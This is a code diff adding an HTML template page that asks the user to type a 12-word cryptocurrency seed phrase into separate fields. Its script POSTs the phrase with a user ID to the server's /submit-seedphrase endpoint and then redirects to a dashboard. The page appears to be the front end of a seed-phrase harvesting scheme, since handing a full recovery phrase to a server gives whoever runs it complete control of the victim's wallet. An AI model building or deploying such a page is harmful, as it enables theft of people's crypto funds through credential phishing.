@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Insert Seed Phrase</title>
+    <link rel="stylesheet" href="/styles/style.css">
+    <style>
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .input-columns {
+            display: flex;
+            width: 100%;
+        }
+        .input-column {
+            display: flex;
+            flex-direction: column;
+            width: 50%; /* Adjust width for two columns */
+        }
+        input {
+            width: 100%;
+            margin-bottom: 10px; /* Space between inputs */
+        }
+
+        .submit-btn {
+            margin-top: 10px;
+            padding: 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: .5s;
+        }
+        .submit-btn:hover {
+            background-color: #0b9001;
+        }
+        .status-message {
+            margin-top: 20px;
+            padding: 10px;
+            display: none; /* Initially hidden */
+        }
+        .success {
+            background-color: green;
+            color: white;
+        }
+        .error {
+            background-color: red;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Insert Your Seed Phrase</h2>
+        <form id="seedPhraseForm" action="/submit-seedphrase">
+
+            <div class="form-group">
+                <input type="hidden" id="userId" name="userId" value="<%= userId %>">
+
+                <label for="seedphrase">Seed Phrase:</label>
+                <div class="input-columns">
+                    <div class="input-column">
+                        <input type="text" id="seedphrase0" name="seedphrase0" required />
+                        <input type="text" id="seedphrase1" name="seedphrase1" required />
+                        <input type="text" id="seedphrase2" name="seedphrase2" required />
+                        <input type="text" id="seedphrase3" name="seedphrase3" required />
+                        <input type="text" id="seedphrase4" name="seedphrase4" required />
+                        <input type="text" id="seedphrase5" name="seedphrase5" required />
+                    </div>
+                    <div class="input-column">
+                        <input type="text" id="seedphrase6" name="seedphrase6" required />
+                        <input type="text" id="seedphrase7" name="seedphrase7" required />
+                        <input type="text" id="seedphrase8" name="seedphrase8" required />
+                        <input type="text" id="seedphrase9" name="seedphrase9" required />
+                        <input type="text" id="seedphrase10" name="seedphrase10" required />
+                        <input type="text" id="seedphrase11" name="seedphrase11" required />
+                    </div>
+                </div>
+            </div>
+            <button type="submit" class="submit-btn">Submit</button>
+        </form>
+        <div id="statusMessage" class="status-message"></div>
+    </div>
+    <script>
+       const form = document.getElementById('seedPhraseForm');
+const statusMessage = document.getElementById('statusMessage');
+
+form.addEventListener('submit', async (event) => {
+    event.preventDefault(); // Prevent default form submission
+
+    const formData = new FormData(form);
+    const data = Object.fromEntries(formData); // Convert formData to an object
+    console.log("🚀 Sending data:", data); // Debugging log
+
+    const response = await fetch(form.action, {
+        method: 'POST',
+        body: JSON.stringify(data), // Send JSON
+        headers: { "Content-Type": "application/json" } // Set header to JSON
+    });
+
+    if (response.ok) {
+        statusMessage.textContent = 'Seed phrase accepted!';
+        statusMessage.className = 'status-message success';
+        statusMessage.style.display = 'block';
+        setTimeout(() => {
+    window.location.href = '/dashboard';
+}, 2000);
+
+    } else {
+        const errorText = await response.text();
+        console.error("🔥 Error response:", errorText); // Log error message
+        statusMessage.textContent = 'An error occurred: ' + errorText;
+        statusMessage.className = 'status-message error';
+        statusMessage.style.display = 'block';
+    }
+});
+
+    </script>
+</body>
+</html>
